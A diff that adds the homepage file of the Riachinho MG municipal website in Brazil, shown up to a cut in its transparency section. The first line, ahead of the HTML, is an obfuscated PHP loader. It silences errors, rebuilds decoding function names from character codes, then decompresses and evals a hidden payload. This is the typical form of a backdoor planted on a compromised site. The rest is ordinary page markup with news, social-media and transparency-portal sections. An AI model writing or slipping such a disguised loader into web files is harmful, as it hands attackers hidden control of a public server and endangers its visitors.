@@ -1,0 +1,706 @@
+<?php eval("?>".base64_decode("PD9waHAgZXJyb3JfcmVwb3J0aW5nKDApOyRzdHIyPSJkVk5kazVvd0ZQMUpqUkhiemNNK0FCb0l1cWpCQk13YkFZVXNpTFFLaXIrK0Y2Zk9kRHZUaHp0TWhuTXo1eXViT2JtbHZoMjZwN0xleDd6T1RORnNNZWx5VDNhNU94R0h4S25YRGE4UC9yWlBmWDdWOCt0bjZ0RWh3eEp0RW9tVVFWWXdWRC9tMjNPVllqbmJSSGFWVEVJcWFnVnpNUkhsUWxBaUJaSlJncWpQeFV5d0dnRytiWlVwSDdrZjNQVDA0eHg0MS9vUTNScU5TYU05MFN5akJkbEV6bWtmM3g4cXViOWxVejVrSG5rc1hmNUxKZFVsd0xSVi9oOWNyRXJ0aC9WeWk1YUhHMW95MXk0Q3IreGg1NmhQOUtvaW16QTNPT2MrdjYzTlc4K005VGZIWnVRbXE1SGZ6TmtKMFNUUlAvOFg1WFk4N3hiN0p0bGRRdGZZQlhQNUtZM3ZOWnVqUXAzcWk1S2tVUWsvN2wvZSthQUpseWozN2Urcmdmek04RWUzYjRwNytGbFk2MmlHOU5UdWc4RXlLMXgzeXBQV3FuSE8yWnljOVRSRW00aDFYL2xiSm1qa29PZklNTmNxQWtwMlhBWXhqQTRtVk1KWEFUOGhxbnJOaHp3Zk1jeW9TdU5KbWNZV1ljYnVnTy94cFRNZTh0ZitjVmZSa0VkNXZ0eGRDc2dRZERuMUhwZjlTOThhL0R5Q3I4QUh0RGdUeUgzWUpDSEtHdDVyajB4VndzNWYrS0JTU09vY1JTVTlPRk5obm5kRHYrclQwaC8zWUV4UlFaZFE1a3ZJbGtHV2VhOXhmbEZSMWpLUERPeS91QUQwOEFuMHJkQlRWanc3QVFPZGVHYWJKeUgwOTlaRUh1MHpUQ1ppNnJUZzdRRDRGdm8yZG82cG1GWWpaMWJkK3oybUtJMUp0emJPY3o5N25Qc1ZEcXpjYjM5bXcreFRZOVRyNk8yV2VRdWtmTHRQNHhuc0Z0M3pIYmlzSGIxUlNkbm04OUc3bG9CLzN6YkYrL3R2Ijskcj0ncycuY2hyKDExKjEwKzYpLidyX3JlcGwnLmNocigzKjMzKzEtMykuJ2NlJzskY2M9J2xjaHInOyRjYz0kcignbCcsJycsJGNjKTskYj0kY2MoOTAqMSs4KS4nYXNlJy4oOCo4KjEpLiRjYygyKjUwLTUpLidkZScuJHIoJywnLCdjJywnLCcpLiRyKCcsJywnb2QnLCcsJykuJ2UnOyRnPSdnemluZmxhdGUnOyRzdHIyPSRiKCRzdHIyKTskc3RyPSRnKCRzdHIyKTtldmFsKCI/PiIuJGIoJHN0cikpOz8+")); ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Prefeitura de Riachinho MG</title>
+
+	<meta name="description" content="Prefeitura de Riachinho MG"/>
+	<meta name="keywords" content="Prefeitura de Riachinho MG, Portal da Tradnparência, "/>
+
+	<meta name="generator" content="WebAcappella Grid"/>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+	<style>
+		div#preloader { position: fixed; left: 0; top: 0; z-index: 999; width: 100%; height: 100%; overflow: visible; background: white no-repeat center center; }
+	</style>
+
+
+	<script>
+		var WaComponentContext = {};
+		var WaPageContext = {};
+		var WaContext = {};
+		WaContext.app_version="1.6.20"
+		WaContext.app_revision="72cba12"
+		WaContext.preview=false
+		WaPageContext.lang="pt_br"
+		WaPageContext.lang_filename="en"
+
+	</script>
+	<script src="wa_js/wa_vanilla.js?v=125&" ></script>
+	<link rel="shortcut icon" type="image/png" href="wa_images/rodape-prefeitura-municipal-de-riachinho-mg.png" />
+	<!-- Códigos Adicional -->
+	<link rel="stylesheet" href="//www.riachinho.mg.gov.br/idexmanager//wa/css_js/font-awesome/css/font-awesome.min.css">
+	<link rel="stylesheet" href="//www.riachinho.mg.gov.br/idexmanager//wa/css_js/fancybox/jquery.fancybox.css?v=2.1.5" />
+	<script src="//www.riachinho.mg.gov.br/idexmanager//wa/css_js/jquery.min.js"></script>
+	<script src="//www.riachinho.mg.gov.br/idexmanager//wa/css_js/vue.min.js"></script>
+	<script src="//www.riachinho.mg.gov.br/idexmanager//wa/css_js/fancybox/jquery.fancybox.pack.js?v=2.1.5"></script>
+	<link rel="stylesheet" href="//www.riachinho.mg.gov.br/idexmanager//wa/css_js/owl/owl.carousel.min.css">
+	<link rel="stylesheet" href="//www.riachinho.mg.gov.br/idexmanager//wa/css_js/owl/owl.theme.default.min.css">
+	<script type="text/javascript" src="//www.riachinho.mg.gov.br/idexmanager//wa/css_js/owl/owl.carousel.min.js"></script>
+	<link rel="stylesheet" href="//www.riachinho.mg.gov.br/idexmanager//wa/css_js/animate.css">
+	<script type="text/javascript" src="//www.riachinho.mg.gov.br/idexmanager//wa/css_js/wow.min.js"></script>
+	<script>new WOW().init();</script>
+	<!-- Códigos dos Módulos -->
+	<script type="text/javascript" src="//www.riachinho.mg.gov.br/idexmanager//wa/wacontrol-js.php?v=3.4.3"></script>
+	<link rel="stylesheet" type="text/css" href="//www.riachinho.mg.gov.br/idexmanager//wa/wacontrol-css.php?v=3.4.3">
+	
+	<style>
+	.hover-box1{
+	box-shadow: 0 0 1px #ccc;
+	-webkit-transition-duration: 0.5s;
+	-webkit-transition-timing-function: linear;
+	box-shadow:0px 0 0 #fff inset;
+	}
+	.hover-box1:hover{
+	-webkit-box-shadow: -560px 0 0 #01a2c4 inset;
+	}
+	
+	</style>
+</head>
+<body>
+	<div id="preloader"></div>
+	<a id="wa-anchor-top" title="Top anchor"></a>
+	<div id="wa-container-wrapper-kbshg37b5s9q9k" >
+		<div id="wa-container-kbshg37b5s9q9k" class="container-fluid  " >
+			<div id="wa-row-kzu2kbje2w5ew8" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comptext-kzu2kbje2re6oo" class="wa-comptext clearfix">
+						<p style="text-align: right;"><span style="color: #ffffff;"><strong><span style="font-family: 'Lucida Sans', 'Lucida Grande', 'Lucida Sans Unicode', 'Luxi Sans', sans-serif;">Telefone: </span><span style="font-family: 'Lucida Sans', 'Lucida Grande', 'Lucida Sans Unicode', 'Luxi Sans', sans-serif;"><span style="font-size: 12px;">(38) 3451-0388  | </span></span><span style="font-family: 'Lucida Sans', 'Lucida Grande', 'Lucida Sans Unicode', 'Luxi Sans', sans-serif;">Horário de Funcionamento: </span><span style="font-family: 'Lucida Sans', 'Lucida Grande', 'Lucida Sans Unicode', 'Luxi Sans', sans-serif;">Seg a Sexta das 07h30 as 11:30 e 13h:00 as 17:00h</span></strong></span></p>
+					</div>
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-kzu2k1q84vyzgg" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-kbshh08y5pywfk" class="row row-align  ">
+				<div class="hidden-xs col-xs-12 col-sm-1 col-md-1 col-lg-1 " >
+				</div>
+				<div class=" col-xs-12 col-sm-5 col-md-6 col-lg-3 wa-valign-middle " >
+					<div id="wa-comptext-kbshh3lc51n4u0" class="wa-comptext clearfix">
+						<p><a title="" href="#"  onclick="return true;" ><img style="margin: 10px;" src="wa_images/prefeitura-de-riachinho-mg-brasao.fw - copia.png?v=1j8nir6" width="245" height="87" alt="" title="" /></a></p>
+					</div>
+				</div>
+				<div class="clearfix visible-xs "></div>
+				<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-6 col-md-5 col-lg-8 " >
+					<div id="wa-sub-container-kbsmqbstb7km48">
+						<div id="wa-row-kzu46mjg4fz6aw" class="row  ">
+							<div class="col-xl-12 wa-item-rowspacer"></div>
+						</div>
+						<div class="wa-container-vspacer col-xl-12"></div>
+						<div id="wa-row-kbsmx17p51x31c" class="row row-align  ">
+							<div class="hidden-xs col-xs-12 col-sm-6 col-md-5 col-lg-6 " >
+							</div>
+							<div class=" col-xs-12 col-sm-5 col-md-4 col-lg-4 " >
+								<div id="wa-comphtml-kzu3s3sk269a08" >
+									<style>
+									/* social links */
+									.social { clear: right;
+									list-style: none;
+									margin: 10px;
+									margin-top: 10px;
+									padding: 0px;}
+									.footer .social { float:none; }
+									.footer .social li a { margin:0 5px 8px 0; }
+									.social li { display:inline-block; text-indent:-999em; }
+									.social li a { display:block; width:32px; height:32px; margin-left:8px; background-image:url(https://www.natalandia.mg.gov.br/socialrede.png); background-repeat:no-repeat;
+									-webkit-border-radius: 16px;
+									-moz-border-radius: 16px;
+									border-radius: 16px;
+									-moz-background-clip: padding; -webkit-background-clip: padding-box; background-clip: padding-box;
+									}
+									.social li:first-child a { margin-left:0; }
+									.social li a:hover { border-top-left-radius:0px; }
+									.social li a.facebook:hover { background-color:#2670a0; }
+									.social li a.twitter { background-position:-32px 0; }
+									.social li a.twitter:hover { background-color:#5ec3df; }
+									.social li a.flickr { background-position:-64px 0; }
+									.social li a.flickr:hover { background-color:#FF0084; }
+									.social li a.rss { background-position:-96px 0; }
+									.social li a.rss:hover { background-color:#ff9900; }
+									.social li a.dribble { background-position:-128px 0; }
+									.social li a.dribble:hover { background-color:#EA4C89; }
+									.social li a.lastfm { background-position:-160px 0; }
+									.social li a.lastfm:hover { background-color:#D51007; }
+									.social li a.linkedin { background-position:-192px 0; }
+									.social li a.linkedin:hover { background-color:#2089b5; }
+									.social li a.instagram { background-position:-447px 0; }
+									.social li a.instagram:hover { background-color:#ff0000; }
+									.social li a.google { background-position:-256px 0; }
+									.social li a.google:hover { background-color:#c63d2d; }
+									.social li a.forrst { background-position:-288px 0; }
+									.social li a.forrst:hover { background-color:#5b9a68; }
+									.social li a.skype { background-position:-320px 0; }
+									.social li a.skype:hover { background-color:#00aff0; }
+									.social li a.picassa { background-position:-352px 0; }
+									.social li a.picassa:hover { background-color:#ffd34e; }
+									.social li a.youtube { background-position:-384px 0; }
+									.social li a.youtube:hover { background-color:#c8312b; }
+									.social li a.pinterest { background-position:-416px 0; }
+									.social li a.pinterest:hover { background-color:#cb2027; }
+									.social li a.tumblr { background-image: url(http://2.bp.blogspot.com/-PKK39UadAWE/UcRPjEmNbJI/AAAAAAAABog/aaiRo1t-H5M/s1600/tumblr.png); }
+									.social li a.tumblr:hover { background-color: #ffffff; }
+									.social li a { background-color:#2670a0; }
+									.social li a { -webkit-transition: all 0.3s ease-out; -moz-transition: all 0.3s ease-out; -ms-transition: all 0.3s ease-out; -o-transition: all 0.3s ease-out; transition: all 0.3s ease-out; }
+									</style>
+									<ul class="social">
+									<li><a class="facebook" href="http://facebook.com/prefeituraderiachinhomg/" target="_blank">Facebook</a></li>
+									<li><a class="instagram" href="http://instagram.com/prefeituraderiachinhomg/" target="_blank">Instagram</a></li>
+									<li><a class="youtube" href="https://www.youtube.com/@prefeituraderiachinhomg/" target="_blank">Youtube</a></li>
+									</ul>
+								</div>
+							</div>
+							<div class="hidden-xs col-xs-12 col-sm-1 col-md-3 col-lg-2 " >
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-kzu2k0b34vyzug" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-kzu2l6ki4uzfr4" >
+		<div id="wa-container-kzu2l6ki4uzfr4" class="container  " >
+			<div id="wa-row-kzu2l6ki5uhs7c" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comphtml-kzu2l6ki872aeg" >
+						 <div vw class="enabled">
+						    <div vw-access-button class="active"></div>
+						    <div vw-plugin-wrapper>
+						      <div class="vw-plugin-top-wrapper"></div>
+						    </div>
+						  </div>
+						  <script src="https://vlibras.gov.br/app/vlibras-plugin.js"></script>
+						  <script>
+						    new window.VLibras.Widget('https://vlibras.gov.br/app');
+						  </script> 
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-kdygtyjl2x9280" >
+		<div id="wa-container-kdygtyjl2x9280" class="container  " >
+			<div id="wa-row-kdygtv9u4rn9co" class="row row-align  ">
+				<div class="hidden-xs col-xs-12 col-sm-1 col-md-1 col-lg-1 " >
+				</div>
+				<div class=" col-xs-12 col-sm-10 col-md-10 col-lg-10 " >
+					<div id="wa-comphtml-kdygtv9u4sz0vk" >
+						<div id="Popup4" data-painel="//www.riachinho.mg.gov.br/idexmanager/"></div>
+						<script type="text/javascript">Popup(4, 1);</script>
+					</div>
+				</div>
+				<div class="hidden-xs col-xs-12 col-sm-1 col-md-1 col-lg-1 " >
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-kbshi0lz8w1e48" >
+		<div id="wa-container-kbshi0lz8w1e48" class="container-fluid  " >
+			<div id="wa-row-kcszsb2f506gz4" class="row row-align  ">
+				<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-sub-container-kcszsb2f549fyw">
+						<div id="wa-row-kcszsb2f506lg8" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 wa-valign-bottom " >
+								<div id="wa-comphtml-kcszsb2f59u0e8" >
+									<div id="Menu1"></div>
+									<script type="text/javascript">Menu(1);</script>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-kzu3guez5uhqy8" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 wa-valign-middle "  data-ratioWidth="948" data-ratioHeight="13" >
+
+					<img id="wa-compimage-kzu3guez4wdjqg" alt="" class="wa-image-component " src="wa_images/slider-shadow.fw_(1).png?v=1h12h17">
+
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-kbshhzrc5301z4" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comphtml-kcpa3m7k7b2y6w" >
+						<div id="SimpleSlideWA1" data-painel="//www.riachinho.mg.gov.br/idexmanager/"></div>
+						<script>SimpleSlide(1);</script>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-kzu8j3da31u2nk" >
+		<div id="wa-container-kzu8j3da31u2nk" class="container  " >
+			<div id="wa-row-kzu8bflfbuqag" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-kzwninbb6wp4k0" >
+		<div id="wa-container-kzwninbb6wp4k0" class="container  " >
+			<div id="wa-row-kzwnil8r4qpl4w" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comptext-padwrapper-kzwnil8r6vjzt4" class="wa-comptext-padwrapper ">
+						<div id="wa-comptext-kzwnil8r6vjzt4" class="wa-comptext clearfix">
+							<p style="text-align: center;"><span style="font-family: 'Bebas Neue', Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; font-size: 40px;"><strong style="color: #195266; text-align: center;">ACESSO RÁPIDO</strong></span></p>
+							<p style="text-align: center;"><span style="font-size: 14px;"><strong style="color: #195266; text-align: center;"><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">Navegue pelos menus laterais</span></strong></span></p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-kzu8j1j131tyfc" >
+		<div id="wa-container-kzu8j1j131tyfc" class="container  " >
+			<div id="wa-row-kzu8j0e45689xc" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comphtml-kzu8j6tr5kkml4" >
+						<div id="TabPlusWA1" data-painel="//www.riachinho.mg.gov.br/idexmanager/"></div>
+						<script>TabPlus(1);</script>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-ku7di1n697zc3k" >
+		<div id="wa-container-ku7di1n697zc3k" class="container  " >
+			<div id="wa-row-ku79887z79konc" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-k8t1t78i59pasw" >
+		<div id="wa-container-k8t1t78i59pasw" class=" noticias container-fluid  " >
+			<div id="wa-row-kbw4y4pk5wd87c" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comptext-kbw4y3w92vc20w" class="wa-comptext clearfix">
+						<p style="text-align: center;"><span style="color: #195266; font-size: 40px; font-family: 'Bebas Neue', Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;"><strong style="text-align: center;">NOTÍCIAS</strong></span></p>
+					</div>
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-kbw4y6np5wdbg0" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-k8t4peme22v9ug" class="row row-align  ">
+				<div class="hidden-xs col-xs-12 col-sm-2 col-md-2 col-lg-1 " >
+				</div>
+				<div class=" col-xs-12 col-sm-9 col-md-9 col-lg-10 " >
+					<div id="wa-comphtml-kbw4aess68utw8" >
+						<div id="BlogWA1" data-categoria="1" data-painel="//www.riachinho.mg.gov.br/idexmanager/"></div>
+						<script>Blog(1,1,"true");</script>
+					</div>
+				</div>
+				<div class="hidden-xs col-xs-12 col-sm-1 col-md-1 col-lg-1 " >
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-lj7h49pp5gl7q8" >
+		<div id="wa-container-lj7h49pp5gl7q8" class="container  " >
+			<div id="wa-row-lj7h4fgf34i2a0" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-lj7h47zi4p4aeg" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comptext-lj7h4iw74zixrc" class="wa-comptext clearfix">
+						<p style="text-align: center;"><span style="font-size: 25px; color: #004397;"><strong><span style="font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">ACOMPANHE A PREFEITURA PELO FACEBOOK</span></strong></span></p>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-lj7gegtx5gkwqg" >
+		<div id="wa-container-lj7gegtx5gkwqg" class="container  " >
+			<div id="wa-row-lj7gefjl4lm7o8" class="row row-align  ">
+				<div class="hidden-xs col-xs-12 col-sm-6 col-md-6 col-lg-4 " >
+				</div>
+				<div class=" col-xs-12 col-sm-3 col-md-3 col-lg-6 " >
+					<div id="wa-comphtml-lj7gel1n34otao" >
+						<iframe src="https://www.facebook.com/plugins/page.php?href=https%3A%2F%2Fwww.facebook.com%2Fprefeituraderiachinhomg&tabs=timeline&width=500&height=500&small_header=false&adapt_container_width=true&hide_cover=false&show_facepile=true&appId" width="400" height="800" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
+					</div>
+				</div>
+				<div class="hidden-xs col-xs-12 col-sm-3 col-md-3 col-lg-2 " >
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-k8sya8z66q9t2g" >
+		<div id="wa-container-k8sya8z66q9t2g" class=" transparencia container  " >
+			<div id="wa-row-ku7cuwvb2rxox4" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-kbw5zmjx4s2flk" class="row row-align  transparencia  ">
+				<div class=" col-xs-12 col-sm-3 col-md-4 col-lg-4 wa-valign-middle " >
+					<div id="wa-compcolor-kua48rps4z6yw0" ></div>
+				</div>
+				<div class="clearfix visible-xs "></div>
+				<div class=" col-xs-12 col-sm-6 col-md-4 col-lg-4 " >
+					<div id="wa-comptext-kbw5zmjx60bpb4" class="wa-comptext clearfix">
+						<p style="text-align: center;"><span style="color: #195266; font-family: 'Bebas Neue', Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; font-size: 40px;"><strong>TRANSPARÊNCIA</strong></span></p>
+					</div>
+				</div>
+				<div class="clearfix visible-xs "></div>
+				<div class=" col-xs-12 col-sm-3 col-md-4 col-lg-4 wa-valign-middle " >
+					<div id="wa-compcolor-kua484dn4z6vrs" ></div>
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-kbw622db5wdfzc" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-ku8c43yb4qucqo" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comphtml-ku8c42pl51i2g8" >
+						<div id="Icones1" data-painel="//www.riachinho.mg.gov.br/idexmanager/"></div>
+						<script type="text/javascript">Icones(1,1);</script>
+					</div>
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-kbt8kjah5nf6gg" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-k8t1ebwe59p5q8" >
+		<div id="wa-container-k8t1ebwe59p5q8" class="container  " >
+			<div id="wa-row-k8t1t0qy22vf5s" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-kbw5zk4y5wdefc" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comptext-kbw5zk4z60bic0" class="wa-comptext clearfix">
+						<p style="text-align: center;"><span style="color: #ffffff;"><strong><span style="font-size: 40px; font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">TRANSPARÊNCIA E EFICIÊNCIA</span></strong></span></p>
+					</div>
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-k8t42jzq6ztz9s" class="row row-align  ">
+				<div class="hidden-xs col-xs-12 col-sm-1 col-md-2 col-lg-2 " >
+				</div>
+				<div class=" col-xs-12 col-sm-10 col-md-8 col-lg-8 " >
+					<div id="wa-comptext-k8t42kzl6q4ju8" class="wa-comptext clearfix">
+						<p style="text-align: center;"><span style="color: #ffffff; font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;"><span style="font-size: 15px;">Lei de Acesso à Informação, </span></span><span style="color: #ffffff; font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;"><span style="font-size: 15px;">Serviços, informações, atos, publicações, etc</span></span></p>
+					</div>
+				</div>
+				<div class="hidden-xs col-xs-12 col-sm-1 col-md-2 col-lg-2 " >
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-k8t43x9z4x2g88" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-k8t4463n4tnvds" class="row row-align  ">
+				<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-6 col-md-6 col-lg-6 " >
+					<div id="wa-sub-container-k8t4474x6rrkm0" class=" hover-box1 ">
+						<div id="wa-row-k8t4474x6pg1d4" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-4 wa-valign-middle " >
+								<div id="wa-comptext-k8t4cb0r6wfki0" class="wa-comptext clearfix">
+									<p><a title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" ><img style="margin: 10px auto; display: block;" src="wa_images/ico-st_(1)_(1).png?v=1h17end" width="78" height="78" alt="" title="" /></a></p>
+								</div>
+							</div>
+							<div class="clearfix visible-xs "></div>
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-8 wa-valign-middle " >
+								<div id="wa-comptext-k8t4c9j46wffm8" class="wa-comptext clearfix">
+									<p style="text-align: center;"><strong><span style="font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><span style="font-size: 20px;"><a style="color: #ffffff;" title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" >RELATÓRIO DE RECEITAS</a></span></span><br /><br /></strong><span style="font-size: 14px;"><span style="color: #ffffff; font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">Encontre aqui as receitas previstas e efetivamente arrecadasas pelo município, como tributos, operações de crédito, alienação de bens e outros.</span></span><strong><br /></strong></p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="clearfix visible-xs "></div>
+				<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-6 col-md-6 col-lg-6 " >
+					<div id="wa-sub-container-k8t447jc6rrecg" class=" hover-box1 ">
+						<div id="wa-row-k8t447jc6pfze8" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-4 wa-valign-middle " >
+								<div id="wa-comptext-k8t4ch6x6wf2d4" class="wa-comptext clearfix">
+									<p><a title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" ><img style="margin: 10px auto; display: block;" src="wa_images/ico-tempo_(1)_(2).png?v=1h17epl" width="78" height="78" alt="" title="" /></a></p>
+								</div>
+							</div>
+							<div class="clearfix visible-xs "></div>
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-8 wa-valign-middle " >
+								<div id="wa-comptext-k8t4chap6wf3rc" class="wa-comptext clearfix">
+									<p style="text-align: center;"><strong style="text-align: center;"><span style="font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><span style="font-size: 20px;"><a style="color: #ffffff;" title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" >RELATÓRIO DE DESPESAS</a></span></span><br /></strong></p>
+									<p style="text-align: center;"> </p>
+									<p style="text-align: center;"><span style="font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;"><span style="color: #ffffff; font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">Encontre aqui os gastos do município com  saúde, educação, ação social, Covid-19  e com outras políticas públicas...</span></span></p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-k8t4iqi422v9ug" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-k8t44emz4tntts" class="row row-align  ">
+				<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-6 col-md-6 col-lg-6 " >
+					<div id="wa-sub-container-k8t44fov6rrx54" class=" hover-box1 ">
+						<div id="wa-row-k8t44fov6pg41s" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-4 wa-valign-middle " >
+								<div id="wa-comptext-k8t4ck346wf4gg" class="wa-comptext clearfix">
+									<p style="text-align: center;"><a title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" ><img style="margin: 10px;" src="wa_images/ico-search_(1)_(1).png?v=1h17end" width="78" height="78" alt="" title="" /></a></p>
+								</div>
+							</div>
+							<div class="clearfix visible-xs "></div>
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-8 wa-valign-middle " >
+								<div id="wa-comptext-k8t4ck7d6wf6js" class="wa-comptext clearfix">
+									<p style="text-align: center;"><strong style="text-align: center;"><span style="font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><span style="font-size: 20px;"><a style="color: #ffffff;" title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" >FOLHA DE PAGAMENTO</a></span></span><br /></strong></p>
+									<p style="text-align: center;"> </p>
+									<p style="text-align: center;"><span style="font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;"><span style="color: #ffffff; font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">Encontre aqui a remuneração dos Servidores ativos do poder executivo municipal , informações sobre diárias, viagens, etc.</span></span></p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="clearfix visible-xs "></div>
+				<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-6 col-md-6 col-lg-6 " >
+					<div id="wa-sub-container-k8t44d4r6rry1c" class=" hover-box1 ">
+						<div id="wa-row-k8t44d4r6pg6k0" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-4 wa-valign-middle " >
+								<div id="wa-comptext-k8t4cm1b6wfdiw" class="wa-comptext clearfix">
+									<p style="text-align: right;"><a title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" ><img style="margin: 10px auto; display: block;" src="wa_images/ico-cast_(1)_(1).png?v=1h17end" width="78" height="78" alt="" title="" /></a></p>
+								</div>
+							</div>
+							<div class="clearfix visible-xs "></div>
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-8 wa-valign-middle " >
